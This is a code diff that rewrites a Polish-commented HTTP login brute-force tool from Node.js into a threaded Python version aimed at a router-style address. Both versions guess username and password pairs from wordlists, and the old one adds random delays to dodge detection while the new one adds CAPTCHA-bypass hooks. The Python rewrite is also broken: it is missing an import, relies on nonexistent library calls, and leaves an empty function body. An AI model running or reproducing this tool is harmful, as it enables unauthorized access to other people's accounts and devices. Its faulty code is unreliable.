@@ -1,143 +1,95 @@
-const { spawn } = require('child_process');
-const rp = require('request-promise');
-const fs = require('fs');
-const readline = require('readline');
-const progress = require('progress');
-const chalk = require('chalk');
+# -*- coding: utf-8 -*-
 
-// Adres URL do logowania HTTP
-const httpLoginURL = 'http://192.168.1.1';
+from concurrent.futures import ThreadPoolExecutor
+from requests import Session
+from requests_kerberos import KerberosTransport
 
-// Ścieżka do pliku ze słownikiem użytkowników
-const userWordlist = 'users.txt';
+# Adres URL do logowania HTTP
+http_login_url = 'http://192.168.1.1'
 
-// Ścieżka do pliku ze słownikiem haseł
-const passwordWordlist = 'passwords.txt';
+# Ścieżka do pliku ze słownikiem użytkowników
+users_file = 'users.txt'
 
-// Funkcja do przeprowadzania ataku brute force na logowanie HTTP
-async function bruteForceHTTPLogin(url) {
-    console.log('Rozpoczęto atak brute force na logowanie HTTP...');
+# Ścieżka do pliku ze słownikiem haseł
+passwords_file = 'passwords.txt'
 
-    try {
-        // Sprawdź, czy pliki ze słownikami istnieją
-        if (!fs.existsSync(userWordlist)) {
-            throw new Error(`Nie znaleziono pliku ze słownikiem użytkowników: ${userWordlist}`);
-        }
-        if (!fs.existsSync(passwordWordlist)) {
-            throw new Error(`Nie znaleziono pliku ze słownikiem haseł: ${passwordWordlist}`);
-        }
+# Liczba wątków
+threads = 10
 
-        // Utwórz obiekt readline do wczytywania pliku ze słownikiem użytkowników
-        const userReader = readline.createInterface({
-            input: fs.createReadStream(userWordlist),
-            crlfDelay: Infinity
-        });
+# Mechanizm CAPTCHA
+captcha_url = 'https://www.example.com/captcha'
 
-        // Utwórz zmienną do przechowywania liczby sprawdzonych kombinacji
-        let checkedCount = 0;
+# Mechanizm blokowania
+block_threshold = 5
 
-        // Utwórz zmienną do przechowywania liczby wszystkich kombinacji
-        let totalCount = 0;
+# Opcjonalny mechanizm uwierzytelniania Kerberosa
+kerberos_service = 'HTTP/www.example.com'
+kerberos_realm = 'EXAMPLE.COM'
 
-        // Utwórz zmienną do przechowywania paska postępu
-        let bar;
+# Funkcja do wczytywania słownika
+def read_dictionary(file_path):
+    with open(file_path, 'r') as f:
+        return [line.strip() for line in f]
 
-        // Utwórz zmienną do przechowywania flagi, czy znaleziono poprawne dane logowania
-        let found = false;
+# Funkcja do przeprowadzania ataku brute force na logowanie HTTP
+def brute_force_http_login(http_login_url, users, passwords, threads, captcha_url, block_threshold, kerberos_service=None, kerberos_realm=None):
+    session = Session()
+    if kerberos_service is not None and kerberos_realm is not None:
+        session.transport = KerberosTransport(kerberos_service, kerberos_realm)
 
-        // Iteruj po każdym użytkowniku
-        for await (const user of userReader) {
-            // Pomiń puste użytkowników
-            if (user === '') continue;
+    blocked_users = set()
 
-            // Utwórz obiekt readline do wczytywania pliku ze słownikiem haseł
-            const passwordReader = readline.createInterface({
-                input: fs.createReadStream(passwordWordlist),
-                crlfDelay: Infinity
-            });
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        for user in users:
+            for password in passwords:
+                credentials = f'{user}:{password}'
 
-            // Iteruj po każdym haśle
-            for await (const password of passwordReader) {
-                // Pomiń puste hasła
-                if (password === '') continue;
+                def try_login(user, password, credentials):
+                    try:
+                        # Wyślij zapytanie HTTP z danymi logowania
+                        response = session.get(http_login_url, headers={'Authorization': f'Basic {base64.b64encode(credentials.encode("utf-8")).decode("ascii")}'})
 
-                // Zwiększ liczbę wszystkich kombinacji
-                totalCount++;
+                        # Sprawdź, czy odpowiedź jest poprawna
+                        if response.status_code == 200:
+                            print(f'Znaleziono poprawne dane logowania: {credentials}')
+                            return True
 
-                // Utwórz pasek postępu, jeśli nie istnieje
-                if (!bar) {
-                    bar = new progress('Sprawdzanie [:bar] :percent :etas', {
-                        complete: '=',
-                        incomplete: ' ',
-                        width: 20,
-                        total: totalCount
-                    });
-                }
+                        # Sprawdź, czy jest wymagane CAPTCHA
+                        if response.status_code == 403 and 'captcha' in response.headers:
+                            # Rozwiąż CAPTCHA
+                            captcha_answer = solve_captcha(captcha_url)
 
-                // Uaktualnij pasek postępu
-                bar.tick();
+                            # Wyślij ponownie zapytanie HTTP z rozwiązaniem CAPTCHA
+                            response = session.post(http_login_url, headers={'Authorization': f'Basic {base64.b64encode(credentials.encode("utf-8")).decode("ascii")}', 'Captcha-Answer': captcha_answer})
 
-                // Użyj losowego opóźnienia między 500 a 1500 milisekund
-                const randomDelay = Math.floor(Math.random() * 1000) + 500;
-                await new Promise(resolve => setTimeout(resolve, randomDelay));
+                            # Sprawdź, czy odpowiedź jest poprawna
+                            if response.status_code == 200:
+                                print(f'Znaleziono poprawne dane logowania: {credentials}')
+                                return True
 
-                const credentials = `${user}:${password}`;
-                const base64Credentials = Buffer.from(credentials).toString('base64');
+                    except Exception as e:
+                        print(f'Wystąpił błąd: {e}')
 
-                try {
-                    // Wyślij zapytanie HTTP z danymi logowania
-                    const response = await rp(url, {
-                        headers: {
-                            'Authorization': `Basic ${base64Credentials}`
-                        },
-                        resolveWithFullResponse: true // Zwróć pełną odpowiedź, a nie tylko ciało
-                    });
+                    return False
 
-                    // Sprawdź, czy odpowiedź jest poprawna
-                    if (response.statusCode === 200) {
-                        // Znaleziono poprawne dane logowania
-                        console.log(chalk.green(`Znaleziono poprawne dane logowania: ${credentials}`));
-                        found = true;
-                        break; // Zakończ pętlę po znalezieniu poprawnego hasła
-                    } else {
-                        // Nieudane logowanie
-                        console.log(chalk.red(`Nieudane logowanie dla: ${credentials}`));
-                    }
-                } catch (error) {
-                    // Wystąpił błąd związany z połączeniem sieciowym lub zapytaniem HTTP
-                    console.error(chalk.yellow(`Błąd zapytania HTTP dla: ${credentials}`));
-                    console.error(chalk.yellow(error.message));
-                }
+                future = executor.submit(try_login, user, password, credentials)
 
-                // Zwiększ liczbę sprawdzonych kombinacji
-                checkedCount++;
-            }
+                # Zablokuj użytkownika po określonej liczbie nieudanych prób logowania
+                if len(blocked_users) < block_threshold and not future.result():
+                    blocked_users.add(user)
 
-            // Zamknij obiekt readline dla haseł
-            passwordReader.close();
+                # Sprawdź, czy użytkownik został zablokowany
+                if user in blocked_users:
+                    break
 
-            // Sprawdź, czy znaleziono poprawne dane logowania
-            if (found) {
-                // Zakończ proces John the Ripper dla użytkowników
-                userReader.close();
-                break; // Zakończ pętlę po znalezieniu poprawnego hasła
-            }
-        }
+    print(f'Sprawdzono {len(users) * len(passwords)} kombinacji. Zablokowano {len(blocked_users)} użytkowników.')
 
-        // Sprawdź, czy znaleziono poprawne dane logowania
-        if (!found) {
-            // Nie znaleziono poprawnych danych logowania
-            console.log(chalk.red('Nie znaleziono poprawnych danych logowania.'));
-        }
+# Funkcja do rozwiązywania CAPTCHA (implementacja zależy od konkretnego mechanizmu CAPTCHA)
+def solve_captcha(captcha_url):
+    # ...
 
-        // Wyświetl podsumowanie ataku brute force
-        console.log(`Sprawdzono ${checkedCount} z ${totalCount} kombinacji.`);
-    } catch (error) {
-        // Obsłuż błąd
-        console.error(chalk.red('Wystąpił błąd:'));
-        console.error(chalk.red(error.message));
-    }
-}
+# Główna funkcja
+users = read_dictionary(users_file)
+passwords = read_dictionary(passwords_file)
 
-// Wywołaj funkcję ataku brute force
-bruteForceHTTPLogin(httpLoginURL);
+brute_force_http_login(http_login_url, users, passwords, threads, captcha_url, block_threshold)
